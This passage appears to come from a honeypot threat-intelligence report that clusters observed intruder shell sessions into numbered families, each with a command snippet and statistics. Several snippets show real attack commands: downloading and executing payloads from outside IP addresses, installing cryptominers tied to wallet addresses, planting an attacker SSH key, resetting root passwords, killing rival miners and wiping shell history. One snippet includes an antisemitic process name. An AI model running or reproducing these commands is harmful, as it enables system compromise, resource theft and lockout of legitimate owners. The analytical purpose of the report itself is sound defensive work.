```text
system
linuxshell
/bin/busybox BITCOIN ;
```

**Consensus Skeleton (op, conn pairs):**
`[('system', ';'), ('linuxshell', ';'), ('busybox', 'EOS')]`

Top operators: [('system', 1), ('linuxshell', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d2f3475373b13f78 | a7da41b67814 |        3 |               1 |

---

## Family 115

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d3409967a02b0f61` (Session: `52b662ba102c`, n_rows=15)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/tmp || cd /dev/shm || cd /mnt || cd /root
curl -o linux_386 http://164.92.207.64:9669/linux_386 || wget http://164.92.207.64:9669/linux_386
curl -o linux_arm http://164.92.207.64:9669/linux_arm || wget http://164.92.207.64:9669/linux_arm
curl -o linux_arm64 http://164.92.207.64:96 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('curl', '||'), ('wget', ';'), ('curl', '||'), ('wget', ';'), ('curl', '||'), ('wget', ';'), ('curl', '||'), ('wget', ';'), ('curl', '||'), ('wget', ';'), ('curl', '||'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('PH_EXEC_2', ';'), ('PH_EXEC_3', ';'), ('PH_EXEC_4', ';'), ('PH_EXEC_5', ';'), ('PH_EXEC_6', ';'), ('rm', 'EOS')]`

Top operators: [('curl', 6), ('wget', 6), ('cd', 5), ('chmod', 1), ('PH_EXEC_1', 1), ('PH_EXEC_2', 1), ('PH_EXEC_3', 1), ('PH_EXEC_4', 1), ('PH_EXEC_5', 1), ('PH_EXEC_6', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d3409967a02b0f61 | 52b662ba102c |       15 |               1 |

---

## Family 279

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d43ea95feb701249` (Session: `02aac8909f8d`, n_rows=2)

**Medoid Execution Snippet:**
```text
lscpu
free -m ;
```

**Consensus Skeleton (op, conn pairs):**
`[('lscpu', ';'), ('free', 'EOS')]`

Top operators: [('lscpu', 1), ('free', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d43ea95feb701249 | 02aac8909f8d |        2 |               1 |

---

## Family 114

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d679807468c3a51f` (Session: `4381dc0b42ac`, n_rows=10)

**Medoid Execution Snippet:**
```text
sh
cd /tmp
rm -rf wget.sh
wget http://107.172.86.42/wget.sh
chmod +x wget.sh;./wget.sh
rm -rf wget.sh
rm -rf curl.sh
curl -O http://107.172.86.42/curl.sh
chmod +x curl.sh;./curl.sh
rm -rf curl.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('cd', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('rm', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('rm', 'EOS')]`

Top operators: [('rm', 4), ('chmod', 2), ('sh', 1), ('cd', 1), ('wget', 1), ('PH_EXEC_1', 1), ('curl', 1), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d679807468c3a51f | 4381dc0b42ac |       10 |               1 |

---

## Family 190

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `da2edc872f5940b2` (Session: `d39b670dba0d`, n_rows=5)

**Medoid Execution Snippet:**
```text
shell
system
ping
sh
/bin/busybox JIGOKU ;
```

**Consensus Skeleton (op, conn pairs):**
`[('shell', ';'), ('system', ';'), ('ping', ';'), ('sh', ';'), ('busybox', 'EOS')]`

Top operators: [('shell', 1), ('system', 1), ('ping', 1), ('sh', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| da2edc872f5940b2 | d39b670dba0d |        5 |               1 |

---

## Family 321

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `db8acb9781fa6169` (Session: `7aa6d1c3491b`, n_rows=4)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('cd', 3), ('chattr', 1), ('lockr', 1), ('rm', 1), ('mkdir', 1), ('echo', 1), ('chmod', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| db8acb9781fa6169 | 7aa6d1c3491b |        4 |               1 |

---

## Family 225

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `dbad1adbc4f10404` (Session: `d2c5e54f500e`, n_rows=1)

**Medoid Execution Snippet:**
```text
MX: 2 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('MX:', 'EOS')]`

Top operators: [('MX:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| dbad1adbc4f10404 | d2c5e54f500e |        1 |               1 |

---

## Family 110

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `dc3165019dbaea4d` (Session: `75f91b0e336c`, n_rows=1)

**Medoid Execution Snippet:**
```text
py ;
```

**Consensus Skeleton (op, conn pairs):**
`[('py', 'EOS')]`

Top operators: [('py', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| dc3165019dbaea4d | 75f91b0e336c |        1 |               1 |

---

## Family 165

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `dfddec9e5e679826` (Session: `beabd8965279`, n_rows=2)

**Medoid Execution Snippet:**
```text
cat /etc/issue
exit ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('exit', 'EOS')]`

Top operators: [('cat', 1), ('exit', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| dfddec9e5e679826 | beabd8965279 |        2 |               1 |

---

## Family 308

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `dfe49ff2e4f687af` (Session: `565c90b3f0b7`, n_rows=2)

**Medoid Execution Snippet:**
```text
cd /tmp
wget http://dns.cyberium.cc/script/ssh -O- | sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', '|'), ('sh', 'EOS')]`

Top operators: [('cd', 1), ('wget', 1), ('sh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| dfe49ff2e4f687af | 565c90b3f0b7 |        2 |               1 |

---

## Family 84

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `e03985e17f5fa8d1` (Session: `bc3c0edcbef8`, n_rows=14)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', '|'), ('head', ';'), ('free', '|'), ('grep', '|'), ('awk', '|'), ('head', ';'), ('ls', '|'), ('head', ';'), ('which', ';'), ('crontab', '|'), ('head', ';'), ('w', '|'), ('head', ';'), ('uname', '|'), ('head', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', '|'), ('head', ';'), ('top', '|'), ('head', ';'), ('uname', '|'), ('head', ';'), ('uname', '|'), ('head', ';'), ('lscpu', '|'), ('grep', '|'), ('head', 'EOS')]`

Top operators: [('head', 12), ('grep', 5), ('uname', 3), ('cd', 2), ('echo', 2), ('cat', 2), ('awk', 2), ('rm', 1), ('mkdir', 1), ('chmod', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e03985e17f5fa8d1 | bc3c0edcbef8 |       14 |               1 |

---

## Family 219

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `e1b2f1fb02bd1054` (Session: `d9d9a6abf907`, n_rows=1)

**Medoid Execution Snippet:**
```text
version ;
```

**Consensus Skeleton (op, conn pairs):**
`[('version', 'EOS')]`

Top operators: [('version', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e1b2f1fb02bd1054 | d9d9a6abf907 |        1 |               1 |

---

## Family 251

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `e1ce9e20d236f52d` (Session: `77a13d84cf12`, n_rows=7)

**Medoid Execution Snippet:**
```text
cd /tmp
rm -rf wget.sh tt.sh
busybox tftp -r tftp.sh -l tt.sh -g 45.95.55.214
chmod 777 tt.sh
sh tt.sh && busybox wget http://45.95.55.214/webssh/wget.sh -O- | sh
rm -rf *
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('rm', ';'), ('busybox', ';'), ('chmod', ';'), ('sh', '&&'), ('busybox', '|'), ('sh', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('rm', 2), ('busybox', 2), ('sh', 2), ('cd', 1), ('chmod', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e1ce9e20d236f52d | 77a13d84cf12 |        7 |               1 |

---

## Family 236

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `e2f5340692d1f09a` (Session: `419080174b73`, n_rows=6)

**Medoid Execution Snippet:**
```text
shell
\n
uname -r
id
id
ls -la /usr/bin/curl ;
```

**Consensus Skeleton (op, conn pairs):**
`[('shell', ';'), ('n', ';'), ('uname', ';'), ('id', ';'), ('id', ';'), ('ls', 'EOS')]`

Top operators: [('id', 2), ('shell', 1), ('n', 1), ('uname', 1), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e2f5340692d1f09a | 419080174b73 |        6 |               1 |

---

## Family 276

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `e6ba26d16136b21d` (Session: `077e7fea9682`, n_rows=2)

**Medoid Execution Snippet:**
```text
unset HISTFILE
unset HISTSIZE ;
```

**Consensus Skeleton (op, conn pairs):**
`[('unset', ';'), ('unset', 'EOS')]`

Top operators: [('unset', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e6ba26d16136b21d | 077e7fea9682 |        2 |               1 |

---

## Family 272

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `e740e107cbc083af` (Session: `6b0805f842bf`, n_rows=3)

**Medoid Execution Snippet:**
```text
Accept-Charset: utf-8,windows-1251
q=0.7,*;q=0.7
Keep-Alive: 300 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('Accept-Charset:', ';'), ('Keep-Alive:', 'EOS')]`

Top operators: [('Accept-Charset:', 1), ('Keep-Alive:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| e740e107cbc083af | 6b0805f842bf |        3 |               1 |

---

## Family 213

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `ec57c2b71df45206` (Session: `9026dc2c1466`, n_rows=1)

**Medoid Execution Snippet:**
```text
start ;
```

**Consensus Skeleton (op, conn pairs):**
`[('start', 'EOS')]`

Top operators: [('start', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ec57c2b71df45206 | 9026dc2c1466 |        1 |               1 |

---

## Family 143

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `ef625e61986ec571` (Session: `6cbe8e475bfe`, n_rows=2)

**Medoid Execution Snippet:**
```text
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('ps', '|'), ('grep', ';'), ('ps', '|'), ('grep', 'EOS')]`

Top operators: [('ps', 2), ('grep', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ef625e61986ec571 | 6cbe8e475bfe |        2 |               1 |

---

## Family 71

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f0ce0488071a1a90` (Session: `cb68c4717462`, n_rows=8)

**Medoid Execution Snippet:**
```text
cat /etc/issue
cd /tmp
wget http://209.141.41.222/bins/x86
chmod 777 x86
./x86 root
cd
curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 49bGaMpdZtB5MqnyAwMk5u9bv3zjpyTE2RnQz2djYCm1goxkSkPuodnW8ayyjNLfLAA72Qm29uJT4RbxCAzbkVH6PxPAZZa
echo firewalla ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('cd', ';'), ('curl', '|'), ('bash', ';'), ('echo', 'EOS')]`

Top operators: [('cd', 2), ('cat', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('curl', 1), ('bash', 1), ('echo', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f0ce0488071a1a90 | cb68c4717462 |        8 |               1 |

---

## Family 194

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f19fe764d111856d` (Session: `f29b17f55630`, n_rows=3)

**Medoid Execution Snippet:**
```text
shell
\n
ps axwww ;
```

**Consensus Skeleton (op, conn pairs):**
`[('shell', ';'), ('n', ';'), ('ps', 'EOS')]`

Top operators: [('shell', 1), ('n', 1), ('ps', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f19fe764d111856d | f29b17f55630 |        3 |               1 |

---

## Family 72

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f2f29bcb93c6f572` (Session: `effeed7077c4`, n_rows=3)

**Medoid Execution Snippet:**
```text
ls
dir
exit ;
```

**Consensus Skeleton (op, conn pairs):**
`[('ls', ';'), ('dir', ';'), ('exit', 'EOS')]`

Top operators: [('ls', 1), ('dir', 1), ('exit', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f2f29bcb93c6f572 | effeed7077c4 |        3 |               1 |

---

## Family 160

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f5e48167ed60c832` (Session: `bb74546abb37`, n_rows=2)

**Medoid Execution Snippet:**
```text
wget http://88.218.17.110/qq.sh
sh qq.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('sh', 'EOS')]`

Top operators: [('wget', 1), ('sh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f5e48167ed60c832 | bb74546abb37 |        2 |               1 |

---

## Family 209

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f62b4cda4dfa61bc` (Session: `e5cbaf7c094e`, n_rows=16)

**Medoid Execution Snippet:**
```text
cd /tmp
rm -rf x86_64
wget http://107.172.249.148/x86_64
curl -O http://107.172.249.148/x86_64
busybox wget http://107.172.249.148/x86_64
chmod 777 x86_64
./x86_64 roots
rm -rf *
pkill cnrig
pkill xmrig
pkill YDEdr
pkill ip
pkill fuckjewishpeopl
pkill x-8.6-.ISIS
pkill x86_64
pkill x86 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('rm', ';'), ('wget', ';'), ('curl', ';'), ('busybox', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', 'EOS')]`

Top operators: [('kill', 8), ('rm', 2), ('cd', 1), ('wget', 1), ('curl', 1), ('busybox', 1), ('chmod', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f62b4cda4dfa61bc | e5cbaf7c094e |       16 |               1 |

---

## Family 86

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f72a303aa1042f16` (Session: `04d8ed364d33`, n_rows=5)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:hYp4Sw5vZFA3" | chpasswd | bash
echo "321" > /var/tmp/.var03522123
rm -rf /var/tmp/.var03522123
cat /var/tmp/.var03522123 | head -n 1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('echo', ';'), ('rm', ';'), ('cat', '|'), ('head', 'EOS')]`

Top operators: [('cat', 2), ('echo', 2), ('grep', 1), ('wc', 1), ('chpasswd', 1), ('bash', 1), ('rm', 1), ('head', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f72a303aa1042f16 | 04d8ed364d33 |        5 |               1 |

---

## Family 65

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f7a1b0e329e76016` (Session: `e4b1ba0a2e4b`, n_rows=1)

**Medoid Execution Snippet:**
```text
curl -O http://134.122.59.164/systemd && curl -O http://134.122.59.164/banner.log && curl -O http://134.122.59.164/bios.txt && curl -O http://134.122.59.164/bone && curl -O http://134.122.59.164/brute && curl -O http://134.122.59.164/hrdmv1 && curl -O http://134.122.59.164/loop && curl -O http://134 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '&&'), ('curl', '||'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('wget', '&&'), ('chmod', '&&'), ('bash', '||'), ('PH_EXEC_2', '&&'), ('apt', '||'), ('yum', '||'), ('dnf', '&&'), ('apt', '||'), ('yum', '||'), ('dnf', '&&'), ('screen', 'EOS')]`

Top operators: [('curl', 10), ('wget', 10), ('apt', 2), ('yum', 2), ('dnf', 2), ('chmod', 1), ('bash', 1), ('PH_EXEC_2', 1), ('screen', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f7a1b0e329e76016 | e4b1ba0a2e4b |        1 |               1 |

---

## Family 178

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f7d020367a111580` (Session: `6f64a4d76dab`, n_rows=15)

**Medoid Execution Snippet:**
```text
cat /etc/issue
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget -q http://179.43.176.41/1a9zxq/meth.x86
cat meth.x86 > meth
chmod +x meth
chmod 777 *
./meth rooted
cat /etc/issue
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget -q http://179.43.176.41/cometome
cat cometome > meth ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('cat', ';'), ('chmod', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('cat', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('cat', ';'), ('chmod', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('history', 'EOS')]`

Top operators: [('cd', 10), ('cat', 4), ('chmod', 4), ('wget', 2), ('PH_EXEC_1', 2), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f7d020367a111580 | 6f64a4d76dab |       15 |               1 |

---

## Family 102

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f93a71cf310e9789` (Session: `765ca6443632`, n_rows=7)

**Medoid Execution Snippet:**
```text
sh
cd /tmp || cd /run || cd /
wget http://45.12.134.23/bins.sh
chmod 777 bins.sh
sh bins.sh
rm -rf *
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('cd', 3), ('sh', 2), ('wget', 1), ('chmod', 1), ('rm', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f93a71cf310e9789 | 765ca6443632 |        7 |               1 |

---

## Family 335

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `fabda1355668422c` (Session: `293cae03c649`, n_rows=5)

**Medoid Execution Snippet:**
```text
cd /tmp
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
echo root:r143gsa1n431g241hs3h12344 | chpasswd | bash
lspci | grep -i --color 'vga\  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('curl', '|'), ('bash', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('lspci', '|'), ('grep', ';'), ('ls', 'EOS')]`

Top operators: [('bash', 2), ('cd', 1), ('curl', 1), ('echo', 1), ('chpasswd', 1), ('lspci', 1), ('grep', 1), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| fabda1355668422c | 293cae03c649 |        5 |               1 |

---

## Family 159

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `fbcb8bef9cb361d9` (Session: `c9bb65712e68`, n_rows=4)

**Medoid Execution Snippet:**
```text
/ip cloud print
ifconfig
uname -a
cat /proc/cpuinfo ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('ifconfig', ';'), ('uname', ';'), ('cat', 'EOS')]`

Top operators: [('PH_EXEC_1', 1), ('ifconfig', 1), ('uname', 1), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| fbcb8bef9cb361d9 | c9bb65712e68 |        4 |               1 |

---

## Family 304

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `fd404c3e65bed5bc` (Session: `9f3a098cdfe0`, n_rows=26)

**Medoid Execution Snippet:**
```text
admn
echo infectednight loader\n
administrator
password
echo infectednight loader\n
admin
4321
echo infectednight loader\n
guest
12345
echo infectednight loader\n
guest
1234
echo infectednight loader\n
user
password
echo infectednight loader\n
admin
1234
echo infectednight loader\n
admin
password
ec ...
```

**Consensus Skeleton (op, conn pairs):**
`[('admn', ';'), ('echo', ';'), ('administrator', ';'), ('password', ';'), ('echo', ';'), ('admin', ';'), ('4321', ';'), ('echo', ';'), ('guest', ';'), ('12345', ';'), ('echo', ';'), ('guest', ';'), ('1234', ';'), ('echo', ';'), ('user', ';'), ('password', ';'), ('echo', ';'), ('admin', ';'), ('1234', ';'), ('echo', ';'), ('admin', ';'), ('password', ';'), ('echo', ';'), ('admin', ';'), ('wbox123', ';'), ('echo', 'EOS')]`

Top operators: [('echo', 9), ('admin', 4), ('password', 3), ('guest', 2), ('1234', 2), ('admn', 1), ('administrator', 1), ('4321', 1), ('12345', 1), ('user', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| fd404c3e65bed5bc | 9f3a098cdfe0 |       26 |               1 |

---

## Family 104

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `ff2fceac76244bf8` (Session: `c7b811cb993a`, n_rows=1)

**Medoid Execution Snippet:**
```text
? ;
```

**Consensus Skeleton (op, conn pairs):**
`[('?', 'EOS')]`

Top operators: [('?', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ff2fceac76244bf8 | c7b811cb993a |        1 |               1 |

---
